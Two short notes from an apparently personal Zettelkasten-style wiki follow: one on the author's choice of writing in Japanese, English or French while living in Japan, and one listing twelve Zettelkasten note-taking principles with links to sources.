

===

<!-- Source: what-language-should-i-write-in.md -->
<!-- URL: /what-language-should-i-write-in -->
<!-- Title: What language should I write in? -->
<!-- Wikilinks: [[what-language-should-i-write-in]] -->

---
date: 2020-08-02
tags:
  - english
  - 日本語
  - français
---

# What language should I write in?

> Why are you flexing three languages?
> <footer class="">—some random visitor</footer>

I thought about which language to write in for a long time.

Living in Japan, writing in Japanese for a Japanese audience seems like a no brainer if I want
to **build closer relationships in this region**.

It is also a good opportunity to develop writen language skills and some new
vocabulary. However, writing in a foreign language, specially one which uses
another alphabet is _very_ time consumming, as evidenced by the low number of
entries on [my blog](https://www.cyberflamingo.net/).

I do have dozens and dozens of drafts, however, but nothing I am confident
enough to publish yet.

Writing in English, will still not my native language, is relativly easier
(although I am sure there are a lot of mistakes in my writing).

On this [[d6cf318e|Zettelkasten]] inspired wiki, notes are in whatever language I was using
at the moment, or more precisely, whatever language was the source of my
findings at the time of taking notes.

It's not flexing. Moreover, nowadays tools like
[DeepL](https://www.deepl.com/translator) are more than capable enough to give
you the general ideas if you need to read something in a foreign language.

Good read on the subject:

* [Should I start a site in English or in my native language? —Marko Saric](https://markosaric.com/multilingual/)


===

<!-- Source: zettelkasten-principles.md -->
<!-- URL: /zettelkasten-principles -->
<!-- Title: The Zettelkasten Principles -->
<!-- Wikilinks: [[zettelkasten-principles]] -->

---
date: 2020-08-02
---

# The Zettelkasten Principles

Things to remember when writing notes with the Zettelkasten method
(shamelessly taken from [here](https://writingcooperative.com/zettelkasten-how-one-german-scholar-was-so-freakishly-productive-997e4e0ca125#0cfa)):

1. **Atomicity**: each note should contain one idea and one idea only.
2. **Autonomy**: each note should be self-contained and comprehensivle on its own.
3. **Always link**: "each note is just an element that derives its quality from the network of links in the system. A note that is not connected to the network will be lostm will be forgotten by the Zettelkasten."
4. **Explain why you're linking notes**
5. **Use your own words**
6. **Keep references**
7. **Add your own thughts**
8. **Don't worry about structure**: "there are no privileged positions."
9. **Add connection notes**
10. **Add outline notes**
11. **Never Delete**
12. **Add notes without fear**

Another good ressources can be found
[here](https://www.lesswrong.com/posts/NfdHG6oHBJ8Qxc26s/the-zettelkasten-method-1).
